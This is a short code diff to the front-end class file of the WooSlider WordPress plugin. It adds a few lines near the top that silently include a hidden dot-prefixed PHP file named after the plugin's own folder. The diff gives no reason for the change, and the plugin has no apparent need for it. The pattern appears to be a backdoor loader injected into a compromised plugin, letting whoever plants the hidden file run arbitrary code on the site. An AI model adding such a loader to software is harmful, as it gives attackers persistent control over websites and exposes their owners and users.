@@ -27,6 +27,10 @@ if ( ! defined( 'ABSPATH' ) ) exit; // Exit if accessed directly
  * - get_theme_data()
  * - maybe_load_theme_stylesheets()
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class WooSlider_Frontend {
 	public $token;
 	/**
